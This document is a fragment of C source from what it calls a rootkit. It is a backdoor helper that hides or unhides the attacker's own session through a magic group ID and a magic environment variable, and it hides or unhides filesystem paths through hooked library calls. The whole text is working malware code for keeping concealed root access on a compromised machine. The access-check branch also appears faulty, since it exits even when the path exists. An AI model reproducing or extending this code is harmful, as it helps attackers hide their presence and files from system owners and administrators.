void option_err(void){
    printf("%s\n", ERR_NO_OPTION);
    exit(-1);
}

void do_self(short mode){
    int putenv_status;

    if(mode == UNHIDEME){
        if(getgid() == 0){
            printf("you're already unhidden. did you mean 'hideself'?\n");
            exit(0);
        }

        /* we need some kind of warning message. this will do for now. */
        printf("you are about to unhide yourself! this will essentially\n");
        printf("just turn you into a regular root user. if you're sure you\n");
        printf("want to continue with this, press any key.\n");
        getchar();

        /* set the magic environment variable,
         * so we still have our rootkit privs. */
        if(getenv(BD_VAR) == NULL){
            putenv_status = putenv(BD_VAR"=1");
            if(putenv_status != 0){
                printf("failed trying to set the magic environment variable!\nexiting...\n");
                exit(0);
            }
        }

        unhide_self();
        system("id");
        exit(0);
    }else if(mode == HIDEME){
        if(getgid() == MAGIC_GID){
            printf("you're already hidden. did you mean 'unhideself'?\n");
            exit(0);
        }

        printf("for whatever reason, you decided to unhide yourself\n");
        printf("at some point. not even going to ask if you're sure\n");
        printf("you want to hide yourself right now. doing it anyway.\n");

        if(getenv(BD_VAR) != NULL)
            if(unsetenv(BD_VAR) < 0)
                printf("there was an error trying to unset the magic environment variable...\n");

        hide_self();
        system("id");
        exit(0);
    }
}

void do_hidingutil(char *const argv[]){
    char *option, *path;
    int path_status;
    hook(CACCESS);

    option = argv[1];
    if(option == NULL) option_err();

    path = argv[2];
    if(path == NULL) option_err();

    if(!strncmp("unhideself", path, 10)) do_self(UNHIDEME);
    else if(!strncmp("hideself", path, 8)) do_self(HIDEME);

    /* if user doesn't want to do either of the two above options...
     * they want to perform something on a path. verify said path
     * actually exists... */
    path_status = (long)call(CACCESS, path, F_OK);

    if(path_status < 0 && errno == ENOENT){
        printf("%s\n", ERR_STAT_PATH);
        exit(-1);   /* path doesn't exist... */
    }else{
        printf("something went wrong calling access on %s\n", path);
        printf("errno value = %d\n", errno);
        exit(-1);
    }

    /* hide or unhide given path */
    if(!strncmp("hide", option, 4)){
        switch(hide_path(path)){
            case PATH_DONE:
                printf("%s\n", ALRDY_HIDDEN_STR);
                break;
            case PATH_SUCC:
                printf("%s\n", PATH_HIDDEN_STR);
                break;
            case PATH_ERR:
                printf("%s\n", ERR_HIDING_PATH);
                break;
        }
    }else if(!strncmp("unhide", option, 6)){
        switch(unhide_path(path)){
            case PATH_DONE:
                printf("%s\n", ALRDY_VISIBLE_STR);
                break;
            case PATH_SUCC:
                printf("%s\n", PATH_VISIBLE_STR);
                break;
            case PATH_ERR:
                printf("%s\n", ERR_UNHIDING_PATH);
                break;
        }
    }else option_err();

    /* done... exit so that the calling function doesn't
     * spaz out about not being able to find './bdv' */
    exit(0);
}